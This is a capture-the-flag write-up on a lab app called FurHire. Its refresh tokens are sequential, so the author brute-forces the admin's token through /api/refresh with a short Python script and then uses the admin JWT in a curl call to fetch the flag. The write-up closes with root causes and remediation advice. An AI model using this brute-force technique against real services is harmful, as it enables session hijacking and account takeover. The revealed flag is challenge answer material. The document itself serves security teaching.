# FurHire CTF Writeup — Insecure Refresh Token

**Challenge URL:** https://lab-1779484679464-8de403.labs-app.bugforge.io/  
**Flag Format:** `bug{flag}`  
**Hint:** "Tokens are fun."  
**Flag:** `bug{774CcdZSSUqZ5zJ9GvOEndmu7Bsl1fcP}`

---

## Summary

The challenge is a pet recruitment platform called "FurHire" built with Express.js. The vulnerability lies in **predictable/sequential refresh tokens** combined with a refresh endpoint that issues JWTs based on a username + refresh token pair — allowing an attacker to hijack any user's session by guessing their refresh token.

---

## Reconnaissance

The app has:
- User registration (`/api/register`) with roles: `user`, `recruiter`
- Login (`/api/login`)
- JWT-based auth with a `refresh_token` cookie
- An admin-only endpoint at `/api/admin/flag`

Registering a user returns a JWT and a `refresh_token` cookie:

```
Set-Cookie: refresh_token=vsisphpstwunkdknnkkjocpdfqeeilma; HttpOnly; Max-Age=600; Path=/
```

The JWT payload:
```json
{"id":8,"username":"kirotest99","role":"user","iat":1779484820,"exp":1779485120}
```

Attempting to register with `"role":"admin"` still assigns `"role":"user"` server-side.

---

## Identifying the Vulnerability

After multiple interactions (login, refresh, new registration), the refresh tokens observed were:

| Action | Refresh Token |
|--------|--------------|
| Register user 1 | `...qeeilma` |
| Login | `...qeeilmb` |
| Refresh | `...qeeilmd` |
| Register user 2 | `...qeeilme` |

The tokens are **sequential** — only the last characters increment. This means all tokens ever issued (including for the admin user) are predictable.

---

## Exploitation

### Step 1: Discover the refresh endpoint

```
POST /api/refresh
Content-Type: application/json
Cookie: refresh_token=<token>

{"username":"admin"}
```

This endpoint takes a username in the body and a refresh_token cookie, and returns a fresh JWT for that user — **if the refresh token matches**.

### Step 2: Brute-force the admin's refresh token

Since tokens are sequential and only differ in the last 2 characters (676 combinations), brute-forcing is trivial:

```python
import requests, string

base = 'vsisphpstwunkdknnkkjocpdfqeeil'
url = 'https://lab-1779484679464-8de403.labs-app.bugforge.io/api/refresh'

for c1 in string.ascii_lowercase:
    for c2 in string.ascii_lowercase:
        token = base + c1 + c2
        r = requests.post(url, json={'username':'admin'}, cookies={'refresh_token': token})
        if 'error' not in r.text and 'token' in r.text:
            print(f'Admin refresh token: {token}')
            print(r.json())
            break
```

**Result:** Admin's refresh token was `vsisphpstwunkdknnkkjocpdfqeeilmf`

### Step 3: Access the flag

```bash
curl -s https://lab-1779484679464-8de403.labs-app.bugforge.io/api/admin/flag \
  -H "Authorization: Bearer <admin_jwt>"
```

**Response:**
```json
{"flag":"bug{774CcdZSSUqZ5zJ9GvOEndmu7Bsl1fcP}"}
```

---

## Root Cause

1. **Predictable refresh tokens** — Tokens are generated sequentially rather than using cryptographically secure random values.
2. **No rate limiting** on the `/api/refresh` endpoint, allowing brute-force.
3. **Refresh token not bound to session context** — Any valid token for a user can be used from any client.

---

## Remediation

- Use `crypto.randomBytes(32)` or equivalent CSPRNG for refresh tokens.
- Bind refresh tokens to additional context (IP, user-agent fingerprint).
- Implement rate limiting on token refresh endpoints.
- Consider token rotation with single-use refresh tokens.

---

## Flag

```
bug{774CcdZSSUqZ5zJ9GvOEndmu7Bsl1fcP}
```
